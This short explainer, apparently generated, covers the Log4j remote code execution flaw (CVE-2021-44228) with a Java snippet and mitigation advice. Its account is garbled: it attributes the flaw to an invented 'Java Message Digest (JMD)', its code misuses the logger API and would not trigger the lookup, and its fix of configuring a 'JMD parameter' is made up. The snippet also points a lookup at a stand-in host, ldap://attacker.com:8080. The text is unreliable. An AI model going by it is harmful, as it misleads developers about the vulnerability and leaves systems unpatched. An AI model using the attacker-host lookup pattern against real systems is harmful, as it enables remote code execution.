The Apache Log4j RCE vulnerability (CVE-2021-44228) occurs when an attacker injects a specially crafted string into the Log4j logging system, which uses a Java Message Digest (JMD) to encode the string. However, if the JMD parameter is not properly configured, the encoded string can be interpreted as a Java code, leading to a remote code execution (RCE) vulnerability. An attacker can exploit this vulnerability by sending a malicious request to the Log4j logging system, which includes the JMD-encoded string. The `JNDI-LDAP` exploit can be used to inject the malicious string, for example:
```java
import org.apache.logging.log4j.core.Logger;

public class Log4jRCE {
  public static void main(String[] args) {
    Logger logger = Logger.getLogger(Log4jRCE.class);
    logger.info("{%s}", "ldap://attacker.com:8080");
  }
}
```
To mitigate this vulnerability, update your Log4j version to at least 2.15.0 and configure the JMD parameter to prevent the encoded string from being interpreted as Java code.

